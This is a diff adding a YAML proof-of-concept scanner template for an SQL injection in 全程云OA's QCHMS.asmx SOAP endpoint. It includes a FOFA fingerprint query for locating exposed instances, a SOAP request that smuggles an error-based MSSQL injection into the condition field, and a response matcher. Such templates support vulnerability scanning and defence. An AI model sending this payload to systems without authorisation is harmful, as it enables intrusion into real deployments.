@@ -1,0 +1,26 @@
+id: poc-yaml-quan-cheng-yun-qchms-asmx-sqli
+info:
+  name: 全程云OA QCHMS.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全程云OA
+  fofa: body="全程云OA" || body="images/yipeoplehover.png"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /OA/HMS/QCHMS.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetProjectResumeList
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetProjectResumeList xmlns=\"http://tempuri.org/\">\n \
+    \     <pageIndex>1</pageIndex>\n      <pageSize>20</pageSize>\n      <condition>\
+    \ AND 1078 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')))</condition>\n\
+    \    </GetProjectResumeList>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,"SqlException") && contains(body,"0x"
+    + t2) && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值") && contains(content_type,"text/xml")
+transport: http
